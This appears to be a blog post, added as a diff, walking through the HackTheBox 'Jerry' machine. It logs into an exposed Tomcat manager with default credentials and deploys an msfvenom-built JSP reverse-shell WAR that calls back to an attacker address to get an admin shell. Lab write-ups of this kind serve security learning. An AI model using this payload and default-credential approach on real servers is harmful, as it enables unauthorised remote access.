@@ -1,0 +1,52 @@
+---
+layout: post
+title:  "HackTheBox - Jerry"
+date:   2021-08-03 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+```
+```
+/aux                  (Status: 200) [Size: 0]
+/com1                 (Status: 200) [Size: 0]
+/com2                 (Status: 200) [Size: 0]
+/com3                 (Status: 200) [Size: 0]
+/con                  (Status: 200) [Size: 0]
+/docs                 (Status: 302) [Size: 0] [--> /docs/]
+/examples             (Status: 302) [Size: 0] [--> /examples/]
+/favicon.ico          (Status: 200) [Size: 21630]             
+/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
+/lpt1                 (Status: 200) [Size: 0]                     
+/lpt2                 (Status: 200) [Size: 0]                     
+/manager              (Status: 302) [Size: 0] [--> /manager/]     
+/nul                  (Status: 200) [Size: 0]                     
+```
+# FOOTHOLD
+
+Visiting port 8080 on the web browser we see its the generic Apache Tomcat page so we go to /manager using the default creds tomcat:s3cret and we see that there is a place to deploy a war file ( we had done this in a previous box so it helped more:) )
+
+```s
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war > please.war
+```
+Then we upload this file and click on deploy.The page reloads and we see a file of the same name we gave ( no extension ).
+Click on it and we get a shell back.
+
+Now finding the flags was a bit frustrating. I looked almost everywhere even in Public but well, no flag.
+So I tried to get into administrator directory ( didn't try it earlier cuz I assumed I had no access without privesc ).
+So imagine how it felt to see I had all access to Administrator directory -_-
+Anyways in \Administrator\Desktop i see a folder flags and inside it there's a file "2 for the price of 1.txt". Frankly thought it was a troll but nvm , ***IT ACTUALLY HAD BOTH THE FLAGS***
+
+# PRIVILEGE ESCALATION
+
+No Privesc. Already had admin access.
